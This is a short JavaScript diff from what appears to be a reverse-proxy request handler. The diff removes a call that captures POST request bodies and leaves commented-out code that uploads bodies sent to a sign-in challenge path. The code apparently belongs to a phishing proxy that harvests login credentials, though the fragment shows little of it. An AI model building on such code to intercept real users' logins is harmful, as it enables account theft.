@@ -183,9 +183,6 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         this.req.headers['accept-encoding'] = 'plain, br'
         if (this.req.method === 'POST') {
             // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-
-            super.captureBody(clientContext.currentDomain, clientContext)
-
         }
         // if (this.req.method === 'POST' && this.req.url.startsWith('/_/signin/challenge')) {
         //     super.uploadRequestBody(clientContext.currentDomain, clientContext)
